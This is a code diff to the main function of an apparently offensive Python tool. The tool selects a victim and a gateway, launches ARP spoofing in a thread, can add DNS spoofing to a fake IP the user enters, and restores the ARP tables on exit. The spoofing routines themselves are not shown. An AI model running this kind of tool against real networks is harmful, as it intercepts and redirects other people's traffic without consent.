@@ -49,27 +49,26 @@ def main():
     victim_ip, victim_mac = choose_host(hosts, "victim")
     gateway_ip, gateway_mac = choose_host(hosts, "gateway")
 
-    # 5. DNS spoofing?
+    # 5. Ask whether to run DNS spoofing
     dns_choice = input("\nEnable DNS spoofing? (y/n): ").strip().lower()
+    fake_ip = None
+    if dns_choice == "y":
+        fake_ip = input("Enter fake IP (default = {}): ".format(attacker_ip)).strip() or attacker_ip
 
-    stop_event = threading.Event()
     # 6. Start ARP spoofing thread
+    stop_event = threading.Event()
     print("[*] Starting ARP spoofing...")
     arp_thread = threading.Thread(
-    target=start_arp_spoofing,
-    args=(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, iface, stop_event),
-    daemon=True
+        target=start_arp_spoofing,
+        args=(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, iface, stop_event),
+        daemon=True
     )
     arp_thread.start()
 
     try:
         if dns_choice == "y":
             print("[*] Starting DNS spoofing...")
-            start_dns_spoofer(
-                fake_ip=attacker_ip,
-                attacker_mac=attacker_mac,
-                iface=iface
-            )
+            start_dns_spoofer(fake_ip=fake_ip, iface=iface)
         else:
             print("[*] ARP spoofing is running. Press Ctrl+C to stop...")
             while True:
@@ -80,8 +79,8 @@ def main():
 
     finally:
         print("[*] Restoring ARP tables...")
-        stop_event.set()           # Signal ARP thread to stop
-        arp_thread.join()          # Wait for it to finish restoring
+        stop_event.set()
+        arp_thread.join()
         print("[+] Cleanup complete. Exiting.")
 
 if __name__ == "__main__":
